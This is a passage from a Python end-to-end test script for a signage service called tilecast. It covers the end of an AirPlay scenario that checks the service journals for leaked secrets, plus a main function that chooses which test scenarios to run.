            text = airplay_journal(unit)
            assert AIRPLAY_PIN not in text and AIRPLAY_DEVICE not in text, f"a secret is in the {unit} journal"
        print("airplay: stopped; signage and previews returned; no secret in the daemon or supervisor journal")
    except Exception:
        for unit in ("tilecast-edge.service", "tilecast-renderer.service", "tilecast-airplay.service"):
            print(f"--- {unit}", file=sys.stderr)
            print(airplay_journal(unit)[-6000:], file=sys.stderr)
        raise
    finally:
        for unit in ("tilecast-renderer.service", "tilecast-edge.service"):
            subprocess.run(["systemctl", "stop", unit], check=False, capture_output=True)
        server.shutdown()


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--bin-dir", required=True)
    parser.add_argument("--renderer", required=True)
    parser.add_argument("--runtime-dir", required=True)
    parser.add_argument("--gst-plugin-dir", required=True)
    parser.add_argument("--scenario", default="all")
    parser.add_argument("--web-helper", default="")
    args = parser.parse_args()
    scenarios = {
        "status": scenario_status,
        "reconnect": scenario_reconnect,
        "fixture": scenario_fixture,
        "selftest": scenario_selftest,
        "website": scenario_website,
        "stream": scenario_stream,
        "widget": scenario_widget,
        "airplay": scenario_airplay,
    }
    # `all` is the set the dev image can run; airplay needs systemd as PID 1.
    selected = (
        [scenario for name, scenario in scenarios.items() if name != "airplay"]
        if args.scenario == "all"
        else [scenarios[args.scenario]]
    )
    for scenario in selected:
        scenario(args)
    print("e2e: all scenarios passed")


if __name__ == "__main__":
    sys.exit(main())
